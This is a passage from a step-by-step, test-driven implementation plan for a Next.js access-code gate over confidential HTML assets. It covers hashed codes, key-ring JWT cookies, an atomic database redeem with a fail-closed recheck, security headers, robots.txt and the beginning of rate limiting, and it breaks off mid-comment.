- Create: `src/lib/codes.ts`, `src/lib/codes.test.ts`

- [ ] **Step 1: Write the failing test** `src/lib/codes.test.ts`:

```ts
import { expect, test } from "vitest";
import { generateCode, generateSlug, hashCode } from "./codes";

test("generateCode is 22 base64url chars (128-bit)", () => {
  const c = generateCode();
  expect(c).toMatch(/^[A-Za-z0-9_-]{22}$/);
});

test("generateCode is unique across calls", () => {
  const set = new Set(Array.from({ length: 1000 }, () => generateCode()));
  expect(set.size).toBe(1000);
});

test("generateSlug is 22 base64url chars", () => {
  expect(generateSlug()).toMatch(/^[A-Za-z0-9_-]{22}$/);
});

test("hashCode is deterministic 64-hex SHA-256 and differs per code", () => {
  const h = hashCode("abc");
  expect(h).toMatch(/^[0-9a-f]{64}$/);
  expect(hashCode("abc")).toBe(h);
  expect(hashCode("abd")).not.toBe(h);
});
```

- [ ] **Step 2: Run to verify it fails**

Run: `npm test -- codes`
Expected: FAIL (module not found).

- [ ] **Step 3: Implement** `src/lib/codes.ts`:

```ts
import { createHash, randomBytes } from "node:crypto";

/** 16 random bytes → base64url → 22 chars, 128-bit. */
function token128(): string {
  return randomBytes(16).toString("base64url");
}

export const generateCode = token128;
export const generateSlug = token128;

/** SHA-256(code) hex. Only the HASH is ever stored/looked-up — never the raw code (spec §3 D3, §5). */
export function hashCode(code: string): string {
  return createHash("sha256").update(code, "utf8").digest("hex");
}
```

- [ ] **Step 4: Run to verify pass**

Run: `npm test -- codes`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/lib/codes.ts src/lib/codes.test.ts
git commit -m "feat: 128-bit CSPRNG code/slug generation"
```

### Task 2.3: Shared `CodeRow` type + display-status helper

> **Design change vs the superseded plan:** there is NO JS validity predicate and NO JS
> `defaultExpiry`. Authorization/validity is enforced in **SQL on DB time** — the redemption path is
> one atomic `UPDATE … WHERE …` (Task 3.1) and the per-load recheck is a `SELECT … WHERE … expires_at
> > now()` (Task 3.1); the 90-day default is a DB column default (Task 2.1). This task only provides
> the row TYPE (inferred from the schema, so a plaintext `code` field can never reappear) and a
> **display-only** status helper for the admin panel. `codeStatus` is NOT an authorization check.

**Files:**
- Modify: `src/lib/codes.ts`, `src/lib/codes.test.ts`

- [ ] **Step 1: Add failing tests** to `src/lib/codes.test.ts`:

```ts
import { codeStatus, type CodeRow } from "./codes";

const base: CodeRow = {
  id: "x", codeHash: "h", assetSlug: "s", label: "",
  createdAt: new Date("2026-01-01T00:00:00Z"),
  expiresAt: new Date("2026-04-01T00:00:00Z"),
  revokedAt: null, lastUsedAt: null, useCount: 0,
};

test("codeStatus is 'active' when not revoked and not past expiry", () => {
  expect(codeStatus(base, new Date("2026-02-01T00:00:00Z"))).toBe("active");
});
test("codeStatus is 'expired' at/after expiry", () => {
  expect(codeStatus(base, new Date("2026-05-01T00:00:00Z"))).toBe("expired");
});
test("codeStatus is 'revoked' regardless of expiry", () => {
  expect(codeStatus({ ...base, revokedAt: new Date("2026-01-15T00:00:00Z") }, new Date("2026-02-01T00:00:00Z"))).toBe("revoked");
});
```

- [ ] **Step 2: Run to verify fail**

Run: `npm test -- codes`
Expected: FAIL (`codeStatus` not defined).

- [ ] **Step 3: Implement** — append to `src/lib/codes.ts`:

```ts
import type { codes } from "./db/schema";

/** Row shape from the `codes` table — has `codeHash`, NEVER a raw `code` (spec §3 D3). */
export type CodeRow = typeof codes.$inferSelect;

/** DISPLAY status for the admin panel ONLY — NOT an authorization check. Real validity is
 *  enforced in SQL on DB time (spec §5, §6); see Task 3.1. Reused by the admin page (Task 5.2). */
export function codeStatus(
  row: Pick<CodeRow, "revokedAt" | "expiresAt">,
  now: Date,
): "active" | "expired" | "revoked" {
  if (row.revokedAt) return "revoked";
  if (row.expiresAt.getTime() <= now.getTime()) return "expired";
  return "active";
}
```

- [ ] **Step 4: Run to verify pass**

Run: `npm test -- codes`
Expected: PASS (all).

- [ ] **Step 5: Commit**

```bash
git add src/lib/codes.ts src/lib/codes.test.ts
git commit -m "feat: CodeRow type (code_hash, no plaintext) + display-status helper"
```

### Task 2.4: Signed tokens — versioned, canonical, key-ring (asset cookie + session)

> Spec §6 step 4 / §8 / §10: tokens carry a schema version `v` and key id `kid`; secrets are **key
> rings** (`<kid>:<secret>` entries, current first). Verify selects the key by `kid` (a forged kid
> selects a key that won't validate the signature → reject), enforces `v`, and strict-validates
> claims. Rotation is graceful: sign with the current kid, verify current+previous, reject retired.
> The asset payload binds `{slug, codeId, cookieExp}`; `cookieExp` (absolute unix seconds) is the
> DB-computed expiry passed in by the gate (Task 3.2) — tokens do NOT invent their own TTL.

**Files:**
- Create: `src/lib/crypto/tokens.ts`, `src/lib/crypto/tokens.test.ts`

- [ ] **Step 1: Write failing tests** `src/lib/crypto/tokens.test.ts`:

```ts
import { expect, test } from "vitest";
import { parseKeyRing, signAssetToken, verifyAssetToken, signSession, verifySession } from "./tokens";

const ringA = parseKeyRing("k1:secret-alpha-000000000000000000000000000000");
const soon = () => Math.floor(Date.now() / 1000) + 3600;

test("asset token round-trips {slug, codeId, cookieExp}", async () => {
  const exp = soon();
  const tok = await signAssetToken({ slug: "s", codeId: "id1", cookieExp: exp }, ringA);
  expect(await verifyAssetToken(tok, "s", ringA)).toEqual({ slug: "s", codeId: "id1", cookieExp: exp });
});

test("rejects a token for a different slug (no cross-asset replay)", async () => {
  const tok = await signAssetToken({ slug: "s", codeId: "id1", cookieExp: soon() }, ringA);
  expect(await verifyAssetToken(tok, "other", ringA)).toBeNull();
});

test("rejects an expired token", async () => {
  const tok = await signAssetToken({ slug: "s", codeId: "id1", cookieExp: Math.floor(Date.now() / 1000) - 1 }, ringA);
  expect(await verifyAssetToken(tok, "s", ringA)).toBeNull();
});

test("key ring: previous kid still verifies during rotation; retired kid is rejected", async () => {
  const tok = await signAssetToken({ slug: "s", codeId: "id1", cookieExp: soon() }, ringA); // signed with k1
  const during = parseKeyRing("k2:secret-beta-1111111111111111111111111111111,k1:secret-alpha-000000000000000000000000000000");
  expect(await verifyAssetToken(tok, "s", during)).not.toBeNull(); // k1 still present
  const after = parseKeyRing("k2:secret-beta-1111111111111111111111111111111");
  expect(await verifyAssetToken(tok, "s", after)).toBeNull(); // k1 retired
});

test("rejects a token whose kid is not in the ring", async () => {
  const tok = await signAssetToken({ slug: "s", codeId: "id1", cookieExp: soon() }, ringA); // kid k1
  const foreign = parseKeyRing("kX:secret-alpha-000000000000000000000000000000"); // same secret, different kid
  expect(await verifyAssetToken(tok, "s", foreign)).toBeNull();
});

test("strict schema: a session token is NOT accepted as an asset token (extra/wrong claims rejected)", async () => {
  const sess = await signSession(ringA, soon()); // has `sub`, lacks slug/codeId/cookieExp
  expect(await verifyAssetToken(sess, "s", ringA)).toBeNull();
});

test("a correctly-signed token WITHOUT exp is rejected (requiredClaims)", async () => {
  const { SignJWT } = await import("jose");
  const forged = await new SignJWT({ v: 1, slug: "s", codeId: "id1", cookieExp: soon() })
    .setProtectedHeader({ alg: "HS256", kid: "k1" })
    .setIssuedAt()
    .sign(new TextEncoder().encode("secret-alpha-000000000000000000000000000000")); // no setExpirationTime
  expect(await verifyAssetToken(forged, "s", ringA)).toBeNull();
});

test("a token whose exp disagrees with cookieExp is rejected (binding check)", async () => {
  const { SignJWT } = await import("jose");
  const exp = soon();
  const skewed = await new SignJWT({ v: 1, slug: "s", codeId: "id1", cookieExp: exp - 999 })
    .setProtectedHeader({ alg: "HS256", kid: "k1" })
    .setIssuedAt()
    .setExpirationTime(exp)
    .sign(new TextEncoder().encode("secret-alpha-000000000000000000000000000000"));
  expect(await verifyAssetToken(skewed, "s", ringA)).toBeNull();
});

test("parseKeyRing rejects empty secrets and duplicate kids", () => {
  expect(() => parseKeyRing("k1:")).toThrow();
  expect(() => parseKeyRing("k1:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,k1:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb")).toThrow();
});

test("session round-trips and rejects a foreign ring", async () => {
  const tok = await signSession(ringA, soon());
  expect(await verifySession(tok, ringA)).toBe(true);
  expect(await verifySession(tok, parseKeyRing("k1:totally-different-secret-22222222222222222222"))).toBe(false);
});
```

- [ ] **Step 2: Run to verify fail**

Run: `npm test -- tokens`
Expected: FAIL (module not found).

- [ ] **Step 3: Implement** `src/lib/crypto/tokens.ts`:

```ts
import { SignJWT, jwtVerify, decodeProtectedHeader } from "jose";

const enc = (s: string) => new TextEncoder().encode(s);
const V = 1; // token schema version

export type KeyRing = { kid: string; key: Uint8Array }[]; // current key FIRST

/** Parse "kid:secret,kid:secret" (current kid first) into a key ring. Rejects empty secrets and
 *  duplicate kids (ambiguous rotation) — obvious misconfigs must fail early, not at verify time. */
export function parseKeyRing(env: string): KeyRing {
  const ring = env.split(",").map((raw) => {
    const e = raw.trim();
    const i = e.indexOf(":");
    if (i <= 0) throw new Error("key ring entry must be 'kid:secret'");
    const secret = e.slice(i + 1);
    if (!secret) throw new Error("key ring secret must be non-empty");
    return { kid: e.slice(0, i), key: enc(secret) };
  });
  if (ring.length === 0) throw new Error("empty key ring");
  if (new Set(ring.map((e) => e.kid)).size !== ring.length) throw new Error("duplicate kid in key ring");
  return ring;
}

async function sign(ring: KeyRing, claims: Record<string, unknown>, exp: number): Promise<string> {
  const { kid, key } = ring[0]; // sign with the current key
  return await new SignJWT({ v: V, ...claims })
    .setProtectedHeader({ alg: "HS256", kid })
    .setIssuedAt()
    .setExpirationTime(exp)
    .sign(key);
}

/** Select key by kid, verify signature+exp, PIN the algorithm to HS256 (block alg-confusion),
 *  enforce version. Returns the payload or null. */
async function verify(ring: KeyRing, token: string): Promise<Record<string, unknown> | null> {
  let kid: string | undefined;
  try { kid = decodeProtectedHeader(token).kid; } catch { return null; }
  const entry = ring.find((e) => e.kid === kid);
  if (!entry) return null; // unknown/retired kid → reject
  try {
    // Pin alg; REQUIRE exp+iat to exist (jose only enforces exp when present — a signed no-exp
    // token must not verify); jose then enforces the exp value.
    const { payload } = await jwtVerify(token, entry.key, {
      algorithms: ["HS256"],
      requiredClaims: ["exp", "iat"],
    });
    if (payload.v !== V) return null; // unknown schema version → reject
    return payload as Record<string, unknown>;
  } catch {
    return null; // bad signature / expired / wrong alg
  }
}

/** Reject any payload with keys outside `allowed` (strict schema — spec §6 step 4). */
function keysOk(p: Record<string, unknown>, allowed: string[]): boolean {
  const set = new Set(allowed);
  return Object.keys(p).every((k) => set.has(k));
}

export type AssetClaims = { slug: string; codeId: string; cookieExp: number };

/** Asset cookie bound to {slug, codeId, cookieExp}. cookieExp = absolute unix seconds (DB-derived). */
export async function signAssetToken(c: AssetClaims, ring: KeyRing): Promise<string> {
  return await sign(ring, { slug: c.slug, codeId: c.codeId, cookieExp: c.cookieExp }, c.cookieExp);
}

export async function verifyAssetToken(token: string, expectedSlug: string, ring: KeyRing): Promise<AssetClaims | null> {
  const p = await verify(ring, token);
  if (!p) return null;
  if (!keysOk(p, ["v", "iat", "exp", "slug", "codeId", "cookieExp"])) return null; // reject extra fields
  if (p.slug !== expectedSlug) return null;                                          // no cross-asset replay
  if (typeof p.codeId !== "string" || typeof p.cookieExp !== "number") return null;
  if (p.exp !== p.cookieExp) return null; // the enforced exp IS the DB-computed cookie_exp — no drift
  return { slug: p.slug, codeId: p.codeId, cookieExp: p.cookieExp };
}

export async function signSession(ring: KeyRing, exp: number): Promise<string> {
  return await sign(ring, { sub: "admin" }, exp);
}

export async function verifySession(token: string, ring: KeyRing): Promise<boolean> {
  const p = await verify(ring, token);
  return !!p && keysOk(p, ["v", "iat", "exp", "sub"]) && p.sub === "admin";
}
```

- [ ] **Step 4: Run to verify pass**

Run: `npm test -- tokens`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/lib/crypto
git commit -m "feat: versioned key-ring asset+session tokens (v/kid, canonical, strict validation)"
```

**BEFORE marking Phase 2 complete:** Review tests vs `docs/pitfalls/testing-pitfalls.md`. Confirm the token tests cover kid-rotation (previous accepted, retired rejected), unknown-kid reject, cross-asset reject, and expiry; confirm the schema has `code_hash` (no plaintext `code`) and a DB-side expiry default. Run `npm test` (all green). Update banner + table.

---

## Phase 3 — Gate route, cookie, headers

**Execution Status:** ⬜ NOT STARTED

> Depends on Phase 1 (✅ bundling verified) and Phase 2 (tokens, validation). Read `docs/pitfalls/implementation-pitfalls.md` → "Fail closed", "Cookie Path", "The access code is the entire secret".
>
> **Assertion-rigor rule (mandatory for this phase's timing/DB tests):** If any test racing on DB state or fail-closed timing flakes, the fix is deterministic synchronization or a controlled fake DB — NOT assertion removal. If it can't be made deterministic, STOP and raise. Prefer mechanism assertions (e.g. "revoked → next load denied") over symptom assertions. Commit subjects touching assertions MUST say add/strengthen/preserve, never "stabilization".

### Task 3.1: Gate DB operations — atomic redeem + fail-closed recheck

> Spec §6 step 4/5: redemption is ONE atomic conditional `UPDATE` (validate + record usage + compute
> `cookie_exp` in a single statement); the per-load recheck is a DB-`now()` `SELECT` that FAILS
> CLOSED. Both run SQL on DB time, so their happy-path tests need a real Postgres — they are
> DB-integration tests guarded by `TEST_DATABASE_URL` and **skipped when it's absent** (so `npm test`
> still passes locally; CI sets it — Task 7.2). The fail-closed test injects a throwing db and always
> runs. Functions take an optional `database` param (defaulting to the app `db`) purely for injection.

**Files:**
- Create: `src/lib/gate.ts`, `src/lib/gate.test.ts`

- [ ] **Step 1: Implement** `src/lib/gate.ts`:

```ts
import { and, eq, gt, isNull, sql } from "drizzle-orm";
import { db } from "./db/client";
import { codes } from "./db/schema";

type DB = typeof db;
export type Redeemed = { codeId: string; cookieExpSec: number };

/** Redemption (spec §6 step 4): ONE atomic statement — validate + increment use_count +
 *  set last_used_at, RETURNING id and cookie_exp = LEAST(now()+24h, expires_at) in unix seconds.
 *  A returned row means the code was valid AND usage was recorded atomically; null = failure. */
export async function redeem(codeHash: string, slug: string, database: DB = db): Promise<Redeemed | null> {
  const rows = await database
    .update(codes)
    .set({ useCount: sql`${codes.useCount} + 1`, lastUsedAt: sql`now()` })
    .where(and(
      eq(codes.codeHash, codeHash),
      isNull(codes.revokedAt),
      gt(codes.expiresAt, sql`now()`),
      eq(codes.assetSlug, slug),
    ))
    .returning({
      codeId: codes.id,
      cookieExp: sql<string>`floor(extract(epoch from least(now() + interval '24 hours', ${codes.expiresAt})))::bigint`,
    });
  const r = rows[0];
  return r ? { codeId: r.codeId, cookieExpSec: Number(r.cookieExp) } : null;
}

/** Per-load recheck (spec §6 step 5): still valid at DB now()? FAILS CLOSED on any DB error. */
export async function recheck(codeId: string, slug: string, database: DB = db): Promise<boolean> {
  try {
    const rows = await database
      .select({ ok: sql<number>`1` })
      .from(codes)
      .where(and(
        eq(codes.id, codeId),
        eq(codes.assetSlug, slug),
        isNull(codes.revokedAt),
        gt(codes.expiresAt, sql`now()`),
      ))
      .limit(1);
    return rows.length > 0;
  } catch {
    return false; // fail closed — see docs/pitfalls/implementation-pitfalls.md
  }
}
```

- [ ] **Step 2: Write the tests** `src/lib/gate.test.ts` (fail-closed always runs; happy paths gated on a real DB):

```ts
import { beforeEach, describe, expect, test } from "vitest";
import { eq } from "drizzle-orm";
import { neon } from "@neondatabase/serverless";
import { drizzle } from "drizzle-orm/neon-http";
import { redeem, recheck } from "./gate";
import { hashCode } from "./codes";
import { codes } from "./db/schema";
import * as schema from "./db/schema";

// Always-on: recheck must fail closed when the DB throws (no real DB needed).
test("recheck FAILS CLOSED when the DB throws", async () => {
  const throwing = { select: () => { throw new Error("db down"); } } as unknown as typeof import("./db/client").db;
  expect(await recheck("id1", "s", throwing)).toBe(false);
});

const url = process.env.TEST_DATABASE_URL;
describe.skipIf(!url)("gate (DB integration)", () => {
  const database = drizzle(neon(url!), { schema });
  beforeEach(async () => { await database.delete(codes); });

  async function seed(overrides: Partial<typeof codes.$inferInsert> = {}) {
    const code = "test-code-aaaaaaaaaaaa";
    await database.insert(codes).values({ codeHash: hashCode(code), assetSlug: "s", ...overrides });
    return code;
  }

  test("redeem returns codeId + future cookieExp and increments use_count", async () => {
    const code = await seed();
    const res = await redeem(hashCode(code), "s", database);
    expect(res?.codeId).toBeTruthy();
    expect(res!.cookieExpSec).toBeGreaterThan(Math.floor(Date.now() / 1000));
    const [row] = await database.select().from(codes);
    expect(row.useCount).toBe(1);
  });

  test("redeem returns null for wrong slug and records NO usage", async () => {
    const code = await seed();
    expect(await redeem(hashCode(code), "other", database)).toBeNull();
    const [row] = await database.select().from(codes);
    expect(row.useCount).toBe(0);
  });

  test("redeem returns null for a revoked code", async () => {
    const code = await seed({ revokedAt: new Date() });
    expect(await redeem(hashCode(code), "s", database)).toBeNull();
  });

  test("recheck true for valid, false immediately after revoke (instant revocation)", async () => {
    const code = await seed();
    const res = await redeem(hashCode(code), "s", database);
    expect(await recheck(res!.codeId, "s", database)).toBe(true);
    await database.update(codes).set({ revokedAt: new Date() }).where(eq(codes.id, res!.codeId));
    expect(await recheck(res!.codeId, "s", database)).toBe(false);
  });

  test("cookieExp is capped by a soon-expiring code (LEAST(now()+24h, expires_at))", async () => {
    const code = await seed({ expiresAt: new Date(Date.now() + 3_600_000) }); // ~1h
    const res = await redeem(hashCode(code), "s", database);
    expect(res!.cookieExpSec - Math.floor(Date.now() / 1000)).toBeLessThan(2 * 3600);
  });
});
```

- [ ] **Step 3: Run**

Run: `npm test -- gate`
Expected: the fail-closed test PASSES; the DB-integration block is SKIPPED unless `TEST_DATABASE_URL` is set. (To run it: `TEST_DATABASE_URL=postgres://… npm test -- gate`.)

- [ ] **Step 4: Commit**

```bash
git add src/lib/gate.ts src/lib/gate.test.ts
git commit -m "feat: atomic redeem (one UPDATE RETURNING cookie_exp) + fail-closed recheck"
```

### Task 3.2: The `/a/[slug]` route handler + shared headers + failure page

**Files:**
- Create: `src/lib/http/headers.ts` (the ONE security-header builder for every response class)
- Create: `src/lib/assets.ts` (read HTML from disk)
- Create: `src/app/failure.ts` (the single generic failure Response factory)
- Replace: `src/app/a/[slug]/route.ts` (spike → real)

> There is no `codeRepo.ts` — `gate.ts` (Task 3.1) runs the atomic SQL directly. The route hashes the
> code, calls `redeem`, and uses the DB-returned `cookieExp`. The rate limiter is wired in Task 3.4.

- [ ] **Step 1: Shared header builder** `src/lib/http/headers.ts` (spec §9 — the SAME set on every gate response so failure-vs-failure parity holds and no header is ever missing):

```ts
export const ASSET_CSP =
  "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; " +
  "connect-src 'self'; img-src 'self' data:; object-src 'none'; frame-src 'none'; worker-src 'none'; " +
  "form-action 'self'; frame-ancestors 'none'; base-uri 'none'";

// Admin gets its OWN restrictive CSP (no 'unsafe-inline' — first-party code, spec §9).
export const ADMIN_CSP =
  "default-src 'self'; frame-ancestors 'none'; base-uri 'none'; object-src 'none'; form-action 'self'";

// Route-specific gate headers (302, asset 200, failure 200) — the parts that must NOT be global.
// HSTS, X-Content-Type-Options, X-Robots-Tag, and Referrer-Policy are applied SITE-WIDE by
// next.config `headers()` (Task 3.3) to avoid duplicate headers; the root/robots pages want those
// too but must stay cacheable, so `no-store` lives here, not globally.
export function gateHeaders(): Record<string, string> {
  return { "cache-control": "no-store", "pragma": "no-cache" };
}

/** Asset 200: gate headers + HTML content-type + the asset CSP. */
export function assetHeaders(): Record<string, string> {
  return { ...gateHeaders(), "content-type": "text/html; charset=utf-8", "content-security-policy": ASSET_CSP };
}

/** Failure page: gate headers + HTML content-type + a strict CSP. Byte-identical everywhere. */
export function failureHeaders(): Record<string, string> {
  return { ...gateHeaders(), "content-type": "text/html; charset=utf-8", "content-security-policy": ADMIN_CSP };
}
```

- [ ] **Step 2: Asset reader** `src/lib/assets.ts`:

```ts
import { readFile } from "node:fs/promises";
import path from "node:path";

const SLUG_RE = /^[A-Za-z0-9_-]{22}$/;
export function isValidSlug(slug: string): boolean { return SLUG_RE.test(slug); }

/** Read the asset body. Returns null if the slug is malformed OR the file is missing/unreadable;
 *  the caller distinguishes "valid code + missing file" (an integrity alert) from a normal miss. */
export async function readAssetHtml(slug: string): Promise<string | null> {
  if (!isValidSlug(slug)) return null;
  try {
    return await readFile(path.join(process.cwd(), "assets", slug, "index.html"), "utf8");
  } catch {
    return null;
  }
}
```

- [ ] **Step 3: Generic failure Response** `src/app/failure.ts` (byte-identical for EVERY failure — spec §3, §6 step 3/5; the second sentence is the static self-service help that replaces any per-cookie branch):

```ts
import { failureHeaders } from "@/lib/http/headers";

const BODY =
  "<!doctype html><meta charset=utf-8><title>Unavailable</title>" +
  "<p>This link is invalid or has expired. If you were sent a link, please re-open it from your " +
  "original message, or contact the sender.</p>";

/** ONE canonical failure response — identical body+status+headers for unknown-slug, wrong-code, and
 *  absent/invalid/lapsed cookie. No conditional per-cookie messaging (would be a validity oracle). */
export function failurePage(): Response {
  return new Response(BODY, { status: 200, headers: failureHeaders() });
}
```

- [ ] **Step 4: Replace the route** `src/app/a/[slug]/route.ts` (spec §6):

> **Do NOT** log `req.url`, `code`, or the cookie value anywhere — the code is the entire secret.

```ts
import { NextResponse, type NextRequest } from "next/server";
import { failurePage } from "@/app/failure";
import { assetHeaders, gateHeaders } from "@/lib/http/headers";
import { readAssetHtml, isValidSlug } from "@/lib/assets";
import { redeem, recheck } from "@/lib/gate";
import { hashCode } from "@/lib/codes";
import { signAssetToken, verifyAssetToken, parseKeyRing } from "@/lib/crypto/tokens";

export const dynamic = "force-dynamic";

const cookieName = (slug: string) => `asset_access_${slug}`;
const ring = () => parseKeyRing(process.env.ASSET_COOKIE_SECRET!);
const isPreview = () => !!process.env.VERCEL_ENV && process.env.VERCEL_ENV !== "production";

export async function GET(req: NextRequest, { params }: { params: Promise<{ slug: string }> }) {
  const { slug } = await params;

  // Spec §10/§11/§15 Q3: a PREVIEW deployment must NOT serve real confidential assets (they are
  // bundled into the preview build). isPreview() is true only when VERCEL_ENV is set-and-not-production
  // (i.e. "preview"/"development"); an UNSET env (local `next dev`) serves so the gate is developable,
  // and prod has VERCEL_ENV="production" so it serves. Owner decision §15 Q3: swap this for a
  // preview-only shared-secret check if you need to QA the gate on preview — one place to change.
  if (isPreview()) return failurePage();

  // Runtime slug-shape check before ANY DB/FS use (defense-in-depth path traversal, spec §6 step 5).
  if (!isValidSlug(slug)) return failurePage();

  const code = req.nextUrl.searchParams.get("code");

  // Redemption precedence (spec §6 step 2): a present ?code always re-validates + re-issues.
  if (code) {
    const res = await redeem(hashCode(code), slug).catch(() => null); // fail closed on DB error
    if (!res) return failurePage();
    const token = await signAssetToken({ slug, codeId: res.codeId, cookieExp: res.cookieExpSec }, ring());
    const redirect = NextResponse.redirect(new URL(`/a/${slug}`, req.url), { status: 302 });
    for (const [k, v] of Object.entries(gateHeaders())) redirect.headers.set(k, v); // no-store etc. on the 302
    redirect.cookies.set(cookieName(slug), token, {
      httpOnly: true, secure: true, sameSite: "lax",
      path: `/a/${slug}`, expires: new Date(res.cookieExpSec * 1000), // capped by code expiry (DB)
    });
    return redirect;
  }

  // Clean load (spec §6 step 5): verify cookie signature, then ALWAYS DB-recheck (fail closed).
  const token = req.cookies.get(cookieName(slug))?.value;
  const claims = token ? await verifyAssetToken(token, slug, ring()) : null;
  if (!claims) return failurePage();
  if (!(await recheck(claims.codeId, slug))) return failurePage(); // instant revoke; DB-time; fail closed

  const html = await readAssetHtml(slug);
  if (html === null) {
    // Valid code but missing asset file = integrity failure (bad deploy / deleted asset), NOT a
    // normal 404 (spec §13). Same page to the client, but alert loudly. NEVER log the raw code.
    console.error(JSON.stringify({ level: "error", event: "asset_file_missing", slug, codeId: claims.codeId }));
    return failurePage();
  }
  return new Response(html, { headers: assetHeaders() });
}
```

- [ ] **Step 5: Remove the spike asset** (real assets come via Phase 6):

```bash
rm -rf assets/spike00000000000000000
```

- [ ] **Step 6: Manual smoke** (no DB needed for this path):

Run: `npm run dev` then `curl -sS -i "http://localhost:3000/a/aaaaaaaaaaaaaaaaaaaaaa"`
Expected: `200`, the "invalid or has expired…" body, and `cache-control: no-store` + `pragma: no-cache` (set by `gateHeaders`/`failureHeaders` in this task). The site-wide headers (HSTS, `x-content-type-options`, `referrer-policy`, `x-robots-tag`) arrive in Task 3.3 — do NOT assert them here. Stop dev server.

- [ ] **Step 7: Commit**

```bash
git add -A
git commit -m "feat: /a/[slug] gate — atomic redeem, DB-capped cookie, preview gate, full headers"
```

### Task 3.3: Global headers + robots.txt

**Files:**
- Create: `src/app/robots.ts`
- Modify: `next.config.ts` (global headers)

- [ ] **Step 1: `src/app/robots.ts`** (spec §9 — `Disallow: /`):

```ts
import type { MetadataRoute } from "next";
export default function robots(): MetadataRoute.Robots {
  return { rules: [{ userAgent: "*", disallow: "/" }] };
}
```

- [ ] **Step 2: Site-wide security headers** — add a `headers()` block to `next.config.ts` (merge with existing config). These four are safe on every route (root, robots, admin, gate), so they live here ONCE — gate/asset responses add only their route-specific `no-store`/CSP (Task 3.2), avoiding duplicate headers:

```ts
  async headers() {
    return [{
      source: "/:path*",
      headers: [
        { key: "X-Robots-Tag", value: "noindex, nofollow, noarchive" },
        { key: "X-Content-Type-Options", value: "nosniff" },
        { key: "Referrer-Policy", value: "no-referrer" },
        // HSTS site-wide (spec §9). Add includeSubDomains/preload only once the whole
        // domain + all subdomains are confirmed HTTPS-clean.
        { key: "Strict-Transport-Security", value: "max-age=63072000" },
      ],
    }];
  },
```

- [ ] **Step 3: Verify**

Run: `npm run dev`, then:
`curl -sS http://localhost:3000/robots.txt` → body has `Disallow: /`;
`curl -sSI http://localhost:3000/ | grep -iE 'x-robots-tag|x-content-type-options|referrer-policy|strict-transport-security'` → all four present. Stop dev server.

- [ ] **Step 4: Commit**

```bash
git add -A
git commit -m "feat: robots.txt Disallow:/ and global X-Robots-Tag noindex"
```

### Task 3.4: Rate limiting on `/a/*` (bucketed + global; valid-cookie exempt)

> Spec §9: limit UNAUTHENTICATED traffic only; a signature-valid-cookie load is limiter-EXEMPT but
> still DB-rechecked (limiter skip ≠ authorization skip — enforced by WHERE the route calls this).
> Bucket well-formed-but-unknown slugs into ONE fixed key so a random-slug spray can't mint unbounded
> rows; keep a generous GLOBAL circuit-breaker. Increments are ATOMIC on DB time. The limiter fails
> OPEN (defense-in-depth; the atomic redeem/recheck is the load-bearing fail-closed control). The
> manifest reader `isKnownSlug` is created here because the limiter's bucketing needs it (Phase 5
> extends the same module).

**Files:**
- Create: `src/lib/manifest.ts` (readManifest + isKnownSlug; Phase 5 adds findOrphans)
- Create: `src/lib/db/rateStore.ts` (atomic upsert), `src/lib/ratelimit.ts`, `src/lib/ratelimit.test.ts`
- Modify: `src/app/a/[slug]/route.ts`, `next.config.ts` (trace the manifest into the `/a/[slug]` lambda)

- [ ] **Step 1: Manifest reader** `src/lib/manifest.ts` (reads the NON-served `.generated` path — spec §7):

```ts
import { readFile } from "node:fs/promises";
import path from "node:path";

export type Manifest = Record<string, { title: string }>;
const MANIFEST_PATH = path.join(process.cwd(), ".generated", "assets-manifest.json");

export async function readManifest(): Promise<Manifest> {
  try { return JSON.parse(await readFile(MANIFEST_PATH, "utf8")); } catch { return {}; }
}

/** True iff the slug is a real, published asset (used to bucket the rate limiter, spec §9). */
export async function isKnownSlug(slug: string): Promise<boolean> {
  return Object.prototype.hasOwnProperty.call(await readManifest(), slug);
}
```

- [ ] **Step 2: Atomic limiter store** `src/lib/db/rateStore.ts` (ONE statement — no read-then-write; DB-time window):

```ts
import { sql } from "drizzle-orm";
import { db } from "./client";
import { rateLimits } from "./schema";

/** Atomically bump the fixed-window counter for `key`; return the new count. Resets the window in
 *  the same statement when the stored window is older than `windowSec` (spec §5 atomic increment). */
export async function bumpRateLimit(key: string, windowSec: number): Promise<number> {
  const stale = sql`${rateLimits.windowStart} < now() - (${windowSec} * interval '1 second')`;
  const rows = await db
    .insert(rateLimits)
    .values({ key, count: 1 }) // window_start defaults to now() on first insert
    .onConflictDoUpdate({
      target: rateLimits.key,
      set: {
        count: sql`case when ${stale} then 1 else ${rateLimits.count} + 1 end`,
        windowStart: sql`case when ${stale} then now() else ${rateLimits.windowStart} end`,
      },
    })
    .returning({ count: rateLimits.count });
  return rows[0]?.count ?? 1;
}
```

- [ ] **Step 3: Failing test** `src/lib/ratelimit.test.ts` (unit-test the bucketing; inject `known`):

```ts
import { expect, test } from "vitest";
import { slugKey } from "./ratelimit";

test("known slugs get their own bucket", async () => {
  expect(await slugKey("redeem", "known000000000000000a", async () => true)).toBe("redeem:known000000000000000a");
});
test("unknown slugs collapse into ONE fixed bucket (bounded cardinality)", async () => {
  expect(await slugKey("redeem", "randaaaaaaaaaaaaaaaaaa", async () => false)).toBe("redeem:unknown-slug");
  expect(await slugKey("redeem", "randbbbbbbbbbbbbbbbbbb", async () => false)).toBe("redeem:unknown-slug");
});
```

- [ ] **Step 4: Run to verify fail** — `npm test -- ratelimit` → FAIL (module not found).

- [ ] **Step 5: Implement** `src/lib/ratelimit.ts`:

```ts
import { bumpRateLimit } from "./db/rateStore";
import { isKnownSlug } from "./manifest";

export const WINDOW_SEC = 60;
export const PER_SLUG_LIMIT = 20;
export const GLOBAL_LIMIT = 2000;   // high-water circuit-breaker across all unauthenticated /a/* traffic
export const LOGIN_WINDOW_SEC = 300;

/** Bucket key: known-manifest slugs get their own bucket; well-formed-but-unknown slugs collapse into
 *  ONE fixed key so a random-slug spray can't mint unbounded rows (spec §9). `known` injectable for tests. */
export async function slugKey(
  kind: "redeem" | "load",
  slug: string,
  known: (s: string) => Promise<boolean> = isKnownSlug,
): Promise<string> {
  return (await known(slug)) ? `${kind}:${slug}` : `${kind}:unknown-slug`;
}

/** Limiter for UNAUTHENTICATED /a/* traffic (redemptions + no-valid-cookie loads). Per-slug bucket
